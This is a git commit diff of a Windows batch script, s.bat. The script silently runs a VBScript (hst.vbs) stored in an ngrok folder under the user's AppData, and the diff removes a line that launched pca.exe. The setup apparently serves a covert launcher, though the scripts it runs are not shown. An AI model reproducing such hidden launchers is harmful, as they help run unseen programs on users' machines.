2dba0b64412d40e9fd30a20125bbd175f7cd94b9
ofutpemata22 <gagi.cu.ci@gmail.com>
2025-04-17 01:00:59 +0300

    a

--- s.bat
+++ s.bat
@@ -4,14 +4,9 @@ setlocal
 set "USER_PROFILE=%USERPROFILE%"
 set "NGROK_DIR=%USER_PROFILE%\AppData\Local\ngrok"
 set "VBS_FILE=%NGROK_DIR%\hst.vbs"
-set "EXE_FILE=%NGROK_DIR%\pca.exe"
 
 if exist "%VBS_FILE%" (
     cscript //nologo "%VBS_FILE%"
-)
-
-if exist "%EXE_FILE%" (
-    start "" "%EXE_FILE%"
 )
 
 endlocal
